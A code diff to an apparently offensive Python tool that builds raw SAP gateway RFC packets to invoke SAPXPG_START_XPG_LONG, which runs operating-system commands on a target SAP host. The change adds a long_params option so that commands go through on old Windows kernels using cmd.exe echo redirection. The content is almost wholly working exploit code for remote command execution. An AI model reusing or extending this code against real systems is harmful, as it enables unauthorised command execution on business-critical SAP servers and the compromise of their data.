@@ -387,11 +387,18 @@ def build_saprfc_th_struct(sid, hostname, instance, target_ip):
     return th
 
 
-def build_saprfxpg(command, params):
-    """Build SAPRFXPG structure for SAPXPG_START_XPG_LONG."""
+def build_saprfxpg(command, params, long_params=None):
+    """Build SAPRFXPG structure for SAPXPG_START_XPG_LONG.
+
+    long_params: if given, used for the LONG_PARAMS field instead of params.
+    Pass long_params="" to send an empty LONG_PARAMS (needed when the kernel
+    concatenates PARAMS+LONG_PARAMS into one command-line string, e.g. old
+    Windows kernels with cmd.exe echo redirection).
+    """
     # Pad command to 128 bytes, params to 1024 and 255 bytes (space-padded)
     extprog = pad_right(command, 128, b" ")
-    longparam = pad_right(params, 1024, b" ")
+    lp = long_params if long_params is not None else params
+    longparam = pad_right(lp, 1024, b" ")
     param = pad_right(params, 255, b" ")
 
     xpg = b""
@@ -504,14 +511,14 @@ def build_sapcpicparam2():
     return p
 
 
-def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params):
+def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=None):
     """Build the full SAPCPIC structure for SAPXPG_START_XPG_LONG."""
     host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)
 
     th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
     cpic_param_data = build_sapcpicparam(target_ip, flag=1)
     cpic_param2_data = build_sapcpicparam2()
-    xpg = build_saprfxpg(command, params)
+    xpg = build_saprfxpg(command, params, long_params=long_params)
     suffix = build_sapcpic_suffix(kernel)
 
     c = b""
@@ -583,14 +590,16 @@ def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, comm
     return c
 
 
-def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params):
+def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=None):
     """Build F_SAP_SEND packet with SAPXPG_START_XPG_LONG.
 
     info = SYNC_CPIC_FUNCTION + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
          = 0x0001 + 0x0004 + 0x0080 = 0x0085
     vector = F_V_SEND_DATA(bit2) + F_V_RECEIVE(bit3) = 0x04 + 0x08 = 0x0C
+
+    long_params: if given, overrides the LONG_PARAMS field (see build_saprfxpg).
     """
-    cpic = build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params)
+    cpic = build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=long_params)
 
     header = build_saprfc_header_v6(
         func_type=0xCB,         # F_SAP_SEND = 203
